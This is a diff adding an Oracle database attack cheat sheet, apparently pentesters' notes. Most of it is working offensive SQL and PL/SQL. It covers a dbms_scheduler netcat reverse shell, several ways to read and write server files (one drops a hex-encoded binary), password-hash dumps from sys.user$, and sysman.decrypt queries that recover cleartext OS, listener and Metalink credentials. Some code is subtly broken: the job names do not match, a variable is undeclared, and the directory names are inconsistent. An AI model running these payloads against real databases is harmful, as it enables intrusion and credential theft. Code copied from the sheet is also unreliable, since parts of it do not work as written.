@@ -1,0 +1,245 @@
+ORACLE
+*on windows ORACLE must run as the "SYSTEM" account
+
+
+DEFAULT USERS
+SYS
+SYSTEM
+DBSNMP
+OUTLN
+
+METADATA TABLES
+ALL_TABLES	-global built-in view
+ALL_TAB_COLUMNS	-global built-in view
+
+SELECT OWNER, TABLE_NAME FROM ALL_TABLES ORDER BY TABLE_NAME;
+	-enumerate all accessible tables for the current user
+
+
+tools
+odat
+oscanner
+tnscmd10g
+opwg
+sqlplus
+	sqlplus user/pass@127.0.0.1
+
+Get Oracle Reverse os-shell:
+begin
+dbms_scheduler.create_job( job_name    => 'MEH1337',job_type    =>
+    'EXECUTABLE',job_action => '/bin/nc',number_of_arguments => 4,start_date =>
+    SYSTIMESTAMP,enabled    => FALSE,auto_drop => TRUE); 
+dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');
+dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
+dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
+dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
+dbms_scheduler.enable('rev_shell'); 
+end; 
+
+
+Reading local files: XMLType
+create or replace directory GETPWDIR as 'C:\APP\ROOT\PRODUCT\11.1.0\
+DB_1\OWB\J2EE\CONFIG';
+select extractvalue(value(c), '/connection-factory/@user')||'/'||
+extractvalue(value(c), '/connection-factory/@password')||'@'||substr
+(extractvalue(value(c), '/connection-factory/@url'),instr(extractvalue
+(value(c), '/connection-factory/@url'),'//')+2) conn
+FROM table(
+XMLSequence(
+ extract(
+ xmltype(
+ bfilename('GETPWDIR', 'data-sources.xml'),
+ nls_charset_id('WE8ISO8859P1')
+ ),
+ '/data-sources/connection-pool/connection-factory'
+ )
+)
+) c
+/
+
+
+Reading Local Files: Oracle Text
+CREATE TABLE files (id NUMBER PRIMARY KEY,path VARCHAR(255) UNIQUE,
+ot_format VARCHAR(6));
+INSERT INTO files VALUES (1, 'c:\boot.ini', NULL); --insert the columns
+to be read into the table (e.g. via SQL Injection)
+CREATE INDEX file_index ON files(path) INDEXTYPE IS ctxsys.context
+PARAMETERS ('datastore ctxsys.file_datastore format column
+ot_format');
+-- retrieve data (boot.ini) from the fulltext index
+SELECT token_text from dr$file_index$i;
+
+
+
+Reading local files: dbms_lob
+Create or replace directory ext AS 'C:\';
+DECLARE
+ buf varchar2(4096);
+BEGIN
+ Lob_loc:= BFILENAME('MEDIA_DIR', 'aht.txt');
+ DBMS_LOB.OPEN (Lob_loc, DBMS_LOB.LOB_READONLY);
+ DBMS_LOB.READ (Lob_loc, 1000, 1, buf);
+ dbms_output.put_line(utl_raw.cast_to_varchar2(buf));
+ DBMS_LOB.CLOSE (Lob_loc);
+END;
+* via external table
+CREATE TABLE products_ext
+(prod_id NUMBER, prod_name VARCHAR2(50), prod_desc VARCHAR2(4000),
+prod_category VARCHAR2(50), prod_category_desc VARCHAR2(4000),
+list_price
+NUMBER(6,2), min_price NUMBER(6,2), last_updated DATE)
+ ORGANIZATION EXTERNAL
+(
+TYPE oracle_loader
+DEFAULT DIRECTORY stage_dir
+ACCESS PARAMETERS
+(RECORDS DELIMITED BY NEWLINE
+ BADFILE ORAHOME:'.rhosts'
+ LOGFILE ORAHOME:'log_products_ext'
+ FIELDS TERMINATED BY ','
+ MISSING FIELD VALUES ARE NULL
+ (prod_id, prod_name, prod_desc, prod_category, prod_category_
+desc, price, price_delta,last_updated char date_format date mask
+"dd-mon-yyyy")
+)
+LOCATION ('data.txt')
+)
+PARALLEL 5
+REJECT LIMIT UNLIMITED;
+
+
+Writing Local Text Files: utl_file
+Create or replace directory ext AS 'C:\';
+DECLARE
+v_file UTL_FILE.FILE_TYPE;
+BEGIN
+v_file:= UTL_FILE.FOPEN('EXT','aht.txt', 'w');
+UTL_FILE.PUT_LINE(v_file,'first row');
+UTL_FILE.NEW_LINE (v_file);
+UTL_FILE.PUT_LINE(v_file,'second row');
+UTL_FILE.FCLOSE(v_file);
+END;
+
+
+Writing Local Binary files: utl_file
+Create or replace directory ext AS 'C:\';
+DECLARE fi UTL_FILE.FILE_TYPE;
+bu RAW(32767);
+BEGIN
+bu:=hextoraw('BF3B01BB8100021E8000B88200882780FB81750288D850E8060083C40
+2CD20C35589E5B80100508D451A50B80F00508D5D00FFD383C40689EC5DC3558BE
+C8B5E088B4E048B5606B80040CD21730231C08BE55DC39048656C6C6F2C20576
+F726C64210D0A');
+fi:=UTL_FILE.fopen('EXT','hello.com','wb',32767);
+UTL_FILE.put_raw(fi,bu,TRUE);
+UTL_FILE.fclose(fi);
+END;
+/
+
+
+Writing Local Files: dbms_advisor (Oracle 10g and later)
+create directory MYDIR as 'C:\';
+exec SYS.DBMS_ADVISOR.CREATE_FILE ('This is the
+content'||chr(13)||'Next line', 'MYDIR', 'myfile.txt');
+
+
+
+Version	
+SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;
+SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;
+SELECT version FROM v$instance;
+Comments	
+SELECT 1 FROM dual — comment
+– NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name ‘dual’ when we’re not actually selecting from a table.
+Current User	
+ELECT user FROM dual
+List Users	
+SELECT username FROM all_users ORDER BY username;
+SELECT name FROM sys.user$; — priv
+List Password Hashes	
+SELECT name, password, astatus FROM sys.user$ — priv, <= 10g.  astatus tells you if acct is locked
+SELECT name,spare4 FROM sys.user$ — priv, 11g
+ Password Cracker	checkpwd will crack the DES-based hashes from Oracle 8, 9 and 10.
+List Privileges	
+SELECT * FROM session_privs; — current privs
+SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, list a user’s privs
+SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, find users with a particular priv
+SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
+List DBA Accounts	
+SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, list DBAs, DBA roles Current Database	
+SELECT global_name FROM global_name;
+SELECT name FROM v$database;
+SELECT instance_name FROM v$instance;
+SELECT SYS.DATABASE_NAME FROM DUAL;
+List Databases	
+SELECT DISTINCT owner FROM all_tables; — list schemas (one per user)
+– Also query TNS listener for other databases.  See tnscmd (services | status).
+List Columns	
+SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;
+SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;
+List Tables	
+SELECT table_name FROM all_tables;
+SELECT owner, table_name FROM all_tables;
+Find Tables From Column Name	
+SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’; — NB: table names are upper case
+Select Nth Row	SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — gets 9th row (rows numbered from 1)
+Select Nth Char	SELECT substr(‘abcd’, 3, 1) FROM dual; — gets 3rd character, ‘c’
+Bitwise AND	
+SELECT bitand(6,2) FROM dual; — returns 2
+SELECT bitand(6,1) FROM dual; — returns0
+ASCII Value -> Char	
+SELECT chr(65) FROM dual; — returns A
+Char -> ASCII Value	
+SELECT ascii(‘A’) FROM dual; — returns 65
+Casting	
+SELECT CAST(1 AS char) FROM dual;
+SELECT CAST(’1′ AS int) FROM dual;
+String Concatenation	
+SELECT ‘A’ || ‘B’ FROM dual; — returns AB
+If Statement	
+BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; — doesn’t play well with SELECT statements
+Case Statement	
+SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — returns 1
+SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — returns 2
+Avoiding Quotes	
+SELECT chr(65) || chr(66) FROM dual; — returns AB
+Time Delay	
+BEGIN DBMS_LOCK.SLEEP(5); END; — priv, can’t seem to embed this in a SELECT
+SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — if reverse looks are slow
+SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — if forward lookups are slow
+SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — if outbound TCP is filtered / slow
+– Also see Heavy Queries to create a time delay
+Make DNS Requests	
+SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;
+SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;
+Command Execution	
+Javacan be used to execute commands if it’s installed.ExtProc can sometimes be used too, though it normally failed for me. :-(
+Local File Access	
+UTL_FILE can sometimes be used.  Check that the following is non-null:
+SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;Java can be used to read and write files if it’s installed (it is not available in Oracle Express).
+Hostname, IP Address	SELECT UTL_INADDR.get_host_name FROM dual;
+SELECT host_name FROM v$instance;
+SELECT UTL_INADDR.get_host_address FROM dual; — gets IP address
+SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — gets hostnames
+Location of DB files	
+SELECT name FROM V$DATAFILE;
+Default/System Databases	
+SYSTEM
+SYSAUX
+
+-- get the cleartext password of the user MGMT_VIEW (generated by
+Oracle
+-- during the installation time, looks like a hash but is a password)
+select view_username, sysman.decrypt(view_password) Password from
+sysman.mgmt_view_user_credentials;
+-- get the password of the dbsnmp user, databases listener and OS
+-- credentials
+select sysman.decrypt(t1.credential_value) sysmanuser, sysman.
+decrypt(t2.credential_value) Password
+from sysman.mgmt_credentials2 t1, sysman.mgmt_credentials2 t2
+where t1.credential_guid=t2.credential_guid
+and lower(t1.credential_set_column)='username'
+and lower(t2.credential_set_column)='password'
+-- get the username and password of the Oracle Knowledgebase Metalink
+select sysman.decrypt(ARU_USERNAME), sysman.decrypt(ARU_PASSWORD) from
+SYSMAN.MGMT_ARU_CREDENTIALS;
